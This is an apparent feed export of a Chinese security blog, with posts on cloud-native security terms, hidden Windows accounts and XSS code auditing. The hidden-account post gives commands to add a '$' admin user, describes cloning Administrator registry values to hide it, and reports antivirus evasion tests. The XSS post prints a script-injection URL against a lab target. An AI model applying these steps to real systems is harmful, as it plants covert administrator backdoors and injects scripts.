《云原生安全-攻防实践与体系构建》</p><p> <a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a></p><p> <a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p><p> <a href="https://cloud.tencent.com/developer/article/1428102">https://cloud.tencent.com/developer/article/1428102</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="容器" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>【云安全】云原生安全是什么？</title>
    <link href="https://www.teamssix.com/220217-160755.html"/>
    <id>https://www.teamssix.com/220217-160755.html</id>
    <published>2022-02-17T08:07:55.000Z</published>
    <updated>2022-02-17T08:19:31.809Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在接触云原生安全的时候碰到了不少以前不知道、不熟悉的名词、技术等等，故在此做个笔记记录一下。</p><h1 id="0x01-一些名词介绍"><a href="#0x01-一些名词介绍" class="headerlink" title="0x01 一些名词介绍"></a>0x01 一些名词介绍</h1><h2 id="容器编排"><a href="#容器编排" class="headerlink" title="容器编排"></a>容器编排</h2><p>容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利。</p><p>常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等。</p><p>以下是 Sysdig 在 2021 年给出的容器编排工具流行度图表，可以看到 Kubernetes 可谓是一骑绝尘。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171557036.png"></p><p>图片来源：<a href="https://dig.sysdig.com/c/pf-2021-container-security-and-usage-report?x=u_WFRi&amp;utm_source=gated-organic&amp;utm_medium=website">https://dig.sysdig.com/c/pf-2021-container-security-and-usage-report?x=u_WFRi&amp;utm_source=gated-organic&amp;utm_medium=website</a></p><h2 id="无服务"><a href="#无服务" class="headerlink" title="无服务"></a>无服务</h2><p>无服务（Serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，这并不是说没有服务器，而是说开发者不用去管服务器只负责开发就行。</p><p>无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的  Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等。</p><h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信。</p><p>这个是 Wiki 上给出的定义，如果具体的想了解微服务是什么可以看知乎上的这个帖子：<a href="https://www.zhihu.com/question/65502802">https://www.zhihu.com/question/65502802</a></p><h2 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h2><p>服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互。</p><p>在服务网格中，请求将通过所在基础架构层中的代理在微服务之间路由，构成服务网格的各个代理有时被称为”sidecar”</p><p>如果没有服务网格，每项微服务都需要进行逻辑编码，才能管理服务间通信，这会导致开发人员无法专注于业务目标，同时，这也意味着通信故障难以诊断，因为管理服务间通信的逻辑隐藏在每项服务中。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171557782.png"></p><h2 id="CNCF"><a href="#CNCF" class="headerlink" title="CNCF"></a>CNCF</h2><p>CNCF (Cloud Native Computing Foundation) 云原生计算基金会，于 2015 年7月21日成立，隶属于 Linux 基金会，CNCF 的口号是坚持和整合开源技术来编排容器作为微服务架构的一部分。</p><p>CNCF 是一个孵化、运营云原生生态的中立组织，CNCF 对于云原生应用的推广和普及发挥着重要的作用。</p><p>在 landscape.cncf.io 可以看到由 CNCF 所维护的云原生全景图。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202202171558254.png"></p><h1 id="0x02-云原生安全"><a href="#0x02-云原生安全" class="headerlink" title="0x02 云原生安全"></a>0x02 云原生安全</h1><h2 id="云原生"><a href="#云原生" class="headerlink" title="云原生"></a>云原生</h2><p>云原生（Cloud Native）可以拆分成「云」和「原生」去看。</p><p>「云」相对的就是本地，传统应用都跑在本地服务器上，而云则表示跑在云服务器上。</p><p>「原生」则可以简单的理解成出生地的意思，放在云环境中所表达的意思就是：在把应用跑到云服务器上时，应该充分的利用云自身的特点，比如弹性和分布式优势。</p><p>如果只是简单的把原来本地跑的业务放到云上，高举“上云”大旗，那只能叫做“拆迁户”，不能叫做云原生；当“上云”的风潮过去后，开始出现了直接就部署在云上的业务，这些业务完全按照“云”的特点去设计，这种是“云”的原住民，可以叫做云原生。</p><p>CNCF 对于云原生的见解为：</p><p>云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API。</p><p>这些技术能够构建容错性好、易于管理和便于观察的松耦合系统。结合可靠的自动化手段，云原生技术使工程师能够轻松地对系统作出频繁和可预测的重大变更。</p><p>对于云原生系统一般有以下特征：</p><ul><li><p>轻、快、不变的基础设施</p></li><li><p>弹性服务编排</p></li><li><p>开发运营一体化</p></li><li><p>微服务架构</p></li><li><p>无服务模型</p></li></ul><h2 id="云原生安全"><a href="#云原生安全" class="headerlink" title="云原生安全"></a>云原生安全</h2><p>在介绍完云原生后，云原生安全就变得容易理解了，云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。</p><p>根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：</p><ul><li><p>容器安全</p></li><li><p>编排系统安全</p></li><li><p>云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等</p></li></ul><p>另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p><p>参考链接：</p><p>《云原生安全-攻防实践与体系构建》</p><p><a href="https://www.jianshu.com/p/a37baa7c3eff">https://www.jianshu.com/p/a37baa7c3eff</a></p><p><a href="https://www.51cto.com/article/652294.html">https://www.51cto.com/article/652294.html</a></p><p><a href="https://jimmysong.io/kubernetes-handbook/cloud-native/cncf.html">https://jimmysong.io/kubernetes-handbook/cloud-native/cncf.html</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E6%9C%8D%E5%8B%99">https://zh.wikipedia.org/wiki/%E5%BE%AE%E6%9C%8D%E5%8B%99</a></p><p><a href="https://www.redhat.com/zh/topics/cloud-native-apps/what-is-serverless">https://www.redhat.com/zh/topics/cloud-native-apps/what-is-serverless</a></p><p><a href="https://www.redhat.com/zh/topics/microservices/what-is-a-service-mesh">https://www.redhat.com/zh/topics/microservices/what-is-a-service-mesh</a></p><p><a href="https://decodezp.github.io/2020/05/23/quickwords43-what-is-cloudnative/">https://decodezp.github.io/2020/05/23/quickwords43-what-is-cloudnative</a></p><p><a href="https://www.redhat.com/zh/topics/containers/what-is-container-orchestration">https://www.redhat.com/zh/topics/containers/what-is-container-orchestration</a></p><p><a href="https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html">https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html</a></p><p><a href="https://www.cncf.io/announcements/2015/06/21/new-cloud-native-computing-foundation-to-drive-alignment-among-container-technologies/">https://www.cncf.io/announcements/2015/06/21/new-cloud-native-computing-foundation-to-drive-alignment-among-container-technologies/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在接触云原生安全的时候碰到了不少以前不知道、不熟悉的名词、技术等等，故在此做个笔记记录一下。&lt;/</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】一键创建隐藏账号</title>
    <link href="https://www.teamssix.com/220118-134825.html"/>
    <id>https://www.teamssix.com/220118-134825.html</id>
    <published>2022-01-18T05:48:25.000Z</published>
    <updated>2022-02-17T08:07:18.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在对以前所做的笔记进行梳理的时候，发现还没记录过隐藏账号的笔记，这里就补充一下。</p><p>在补充的过程中发现，利用注册表创建隐藏账号的方法还是挺繁琐的，虽然已经有一键化的工具，但是使用起来都不是太顺手，另外在使用某款工具的过程中还把我虚拟机干炸了，幸好打的有快照。</p><p>既然没有顺手的，那就自己写一个吧，不过在此之前，还是先看看手动是怎么创建隐藏账号的。</p><h1 id="0x01-手动创建隐藏账号与发现的方法"><a href="#0x01-手动创建隐藏账号与发现的方法" class="headerlink" title="0x01 手动创建隐藏账号与发现的方法"></a>0x01 手动创建隐藏账号与发现的方法</h1><h2 id="方法一：添加-符"><a href="#方法一：添加-符" class="headerlink" title="方法一：添加 $ 符"></a>方法一：添加 $ 符</h2><p>添加隐藏用户并添加到管理员组</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ Passw0rd <span class="token operator">/</span>addnet localgroup administrators teamssix$ <span class="token operator">/</span>add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181400117.png"></p><p>在使用 net user 查看当前用户时，是看不到这个用户的，但是在控制面板里可以看到该用户</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401187.png"></p><p>使用 wmic 也能看到该用户</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">wmic useraccount get Name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402599.png"></p><p>删除该用户直接用 net user 即可</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401888.png"></p><h2 id="方法二：修改注册表"><a href="#方法二：修改注册表" class="headerlink" title="方法二：修改注册表"></a>方法二：修改注册表</h2><p>打开注册表</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">HKEY_LOCAL_MACHINE\SAM\SAM\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>赋予管理员用户完全控制的权限</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402115.png"></p><p>关闭注册表，再次来到刚才的路径，这时就可以看到 SAM 文件夹里的内容了</p><p>这时需要导出三个文件：</p><ul><li>Users 下的管理员文件</li><li>Users 下的隐藏账号文件</li><li>Names 下的隐藏账号文件</li></ul><p>Users 下的文件名可能不太好判断归属那个用户，不过在选择 Names 下的用户时，可以看到相应的类型值，比如 teamssix$ 账号对应的是 0x3ea，那么 Users 下的文件夹就是 000003EA，同理找到管理员 Administrator 对应的是 00001F4</p><p>找到这三个文件后，右击选择导出</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402156.png"></p><p>使用记事本打开导出的 Users 下的两个文件，将 Administrator 中的 F 键值内容进行替换到 teamssix$ 中</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181403665.png"></p><p>然后删除 teamssix$ 用户</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401888.png"></p><p>这个时候其实 teamssix$ 用户就被删掉了，然后利用刚才的注册表文件再添加上 teamssix$ 用户</p><p>双击刚才导出的 Users 下的 teamssix$ 文件和 Names 下的 teamssix$ 文件。</p><p>此时，利用注册表新建隐藏账号就做好了，不管是 net user 还是控制面板都看不到该用户。</p><p>使用 net user teamssix$ 能看到该用户，说明该用户是存在的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181403858.png"></p><p>从上面图片可以看到其实账号是禁用的状态，因此想使用这个账号，还得给它启用才行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>active<span class="token punctuation">:</span>yes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想删除这个账号，在注册表中删除 Users 下的 000003EA 和 Names 下的 teamssix$ 就行了。</p><p>不过这种方法依然是有破绽的，比如在注册表里还是能发现 teamssix$ 用户的，使用 wmic 也能看到该用户。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181404578.png"></p><p>而且当电脑重启后，在计算机管理里也能看到刚刚创建的隐藏账号。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181404120.png"></p><h1 id="0x02-创建隐藏账号的工具介绍"><a href="#0x02-创建隐藏账号的工具介绍" class="headerlink" title="0x02 创建隐藏账号的工具介绍"></a>0x02 创建隐藏账号的工具介绍</h1><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>对比了下两种方法，虽然都有办法去发现隐藏账号，但是第二种修改注册表的方法很明显隐藏性还是更好些，只是操作起来有些麻烦，但是又没有什么用着顺手的工具，所以这里自己写了一个利用注册表添加隐藏账号的小工具。</p><p><strong>免责声明：请勿将工具用于非法用途，开发人员不承担任何责任，也不对任何滥用或损坏负责。</strong></p><p>工具地址：<a href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181405087.png">命令帮助信息</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token operator">-</span>c 检查当前系统的隐藏账户<span class="token operator">-</span>d 指定要删除的用户名，如果添加的用户名不是以 $ 结尾，则工具会自动在用户名后添加上 $<span class="token operator">-</span>p 指定添加的用户的密码<span class="token operator">-</span>u 指定要添加的用户名，如果添加的用户名不是以 $ 结尾，则工具会自动在用户名后添加上 $<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>例如这里添加一个用户名为 teamssix 的隐藏账号，工具会自动在用户名后添加 $ 符，因此创建后的用户名为 teamssix$</p><p>使用的时候，记得在管理员权限下运行，不然会提示权限不足</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>u teamssix <span class="token operator">-</span>p Passw0rd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181405373.png"></p><p>创建完后，通过 net user 和控制面板等等都是看不到这个账号的</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406619.png"></p><p>检查当前系统的隐藏账号</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406908.png"></p><p>删除 teamssix 隐藏账号，当删除完账号后，再次检查当前系统的隐藏账号，可以看到就提示没有隐藏账号了</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>d teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406722.png"></p><h2 id="免杀能力"><a href="#免杀能力" class="headerlink" title="免杀能力"></a>免杀能力</h2><p>因为在工具里是利用 Windows API 创建的用户，所以天然具有一定的免杀能力，不过因为工具里需要对注册表进行操作，所以还是会被杀软发现。</p><p>我这里用 360 和火绒测试了下免杀的能力，情况大体如下：</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406221.png"></p><p>整体上，除了在添加用户的时候，360 会弹窗询问要不要允许修改注册表外，其他时候杀软都是没动静的，个人觉着还行。</p><p>不过这个也只是我当时的检测情况，也许明天后天就会被查杀，这个也是很正常的事儿。</p><h1 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h1><p>我看到一些同类工具只有添加隐藏账号的功能，这个工具除了添加隐藏账号外，我还给它也加入了检查隐藏账号和删除隐藏账号的功能，这样不管是红队还是蓝队，都可以使用到这款工具。</p><p>最后，如果有什么 bug 可以直接在 Github 的项目地址上给我提 issue，另外 Star 就不要了，你懂的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在对以前所做的笔记进行梳理的时候，发现还没记录过隐藏账号的笔记，这里就补充一下。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    <category term="蓝队" scheme="https://www.teamssix.com/tags/%E8%93%9D%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】跨站脚本 XSS</title>
    <link href="https://www.teamssix.com/211220-164519.html"/>
    <id>https://www.teamssix.com/211220-164519.html</id>
    <published>2021-12-20T08:45:19.000Z</published>
    <updated>2021-12-21T07:18:39.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-反射型-XSS"><a href="#0x01-反射型-XSS" class="headerlink" title="0x01 反射型 XSS"></a>0x01 反射型 XSS</h1><p>以下代码展示了反射型 XSS 漏洞产生的大概形式</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> studentId <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"sid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"name = "</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"studentId = "</span><span class="token operator">+</span>studentId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当访问 <a href="http://localhost:8080/xss_demo/reflected_xss.jsp?name=1&sid=alert(1)">http://localhost:8080/xss_demo/reflected_xss.jsp?name=1&amp;sid=%3Cscript%3Ealert(1)%3C/script%3E</a> 时，就会触发 XSS 代码</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646020.png"></p><h1 id="0x02-存储型-XSS"><a href="#0x02-存储型-XSS" class="headerlink" title="0x02 存储型 XSS"></a>0x02 存储型 XSS</h1><p>这里以 zrlog v1.9.1.0227 靶场进行示例</p><h2 id="部署靶场"><a href="#部署靶场" class="headerlink" title="部署靶场"></a>部署靶场</h2><p>靶场 war 包下载地址：<a href="http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war">http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war</a></p><p>安装参考官方安装文档即可：<a href="https://blog.zrlog.com/post/how-to-install-zrlog">https://blog.zrlog.com/post/how-to-install-zrlog</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>来到后台，编辑标题处，在标题的位置插入 XSS 语句</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646981.png"></p><p>访问主页，可以看到 XSS 语句被执行</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646003.png"></p><p>通过抓包可以看到提交 XSS 语句时的 URL 为 /api/admin/website/update</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看该项目的 Web.xml 可以看到通过类 com.zrlog.web.config.ZrLogConfig 进行访问控制</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>configClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>com.zrlog.web.config.ZrLogConfig<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 查看 WEB-INF/classes/com/zrlog/web/config/ZrLogConfig.class 文件</p><p>可以看到这份源码的路由配置信息</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configRoute</span><span class="token punctuation">(</span><span class="token class-name">Routes</span> routes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/post"</span><span class="token punctuation">,</span> <span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">,</span> <span class="token class-name">APIController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/install"</span><span class="token punctuation">,</span> <span class="token class-name">InstallController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AdminRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看 AdminRoutes() 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">AdminRoutes</span> <span class="token keyword">extends</span> <span class="token class-name">Routes</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">AdminRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> <span class="token class-name">AdminPageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin/template"</span><span class="token punctuation">,</span> <span class="token class-name">AdminTemplatePageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin/article"</span><span class="token punctuation">,</span> <span class="token class-name">AdminArticlePageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin"</span><span class="token punctuation">,</span> <span class="token class-name">AdminController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/link"</span><span class="token punctuation">,</span> <span class="token class-name">LinkController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/comment"</span><span class="token punctuation">,</span> <span class="token class-name">CommentController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/tag"</span><span class="token punctuation">,</span> <span class="token class-name">TagController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/type"</span><span class="token punctuation">,</span> <span class="token class-name">TypeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/nav"</span><span class="token punctuation">,</span> <span class="token class-name">BlogNavController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/article"</span><span class="token punctuation">,</span> <span class="token class-name">ArticleController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/website"</span><span class="token punctuation">,</span> <span class="token class-name">WebSiteController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/template"</span><span class="token punctuation">,</span> <span class="token class-name">TemplateController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token 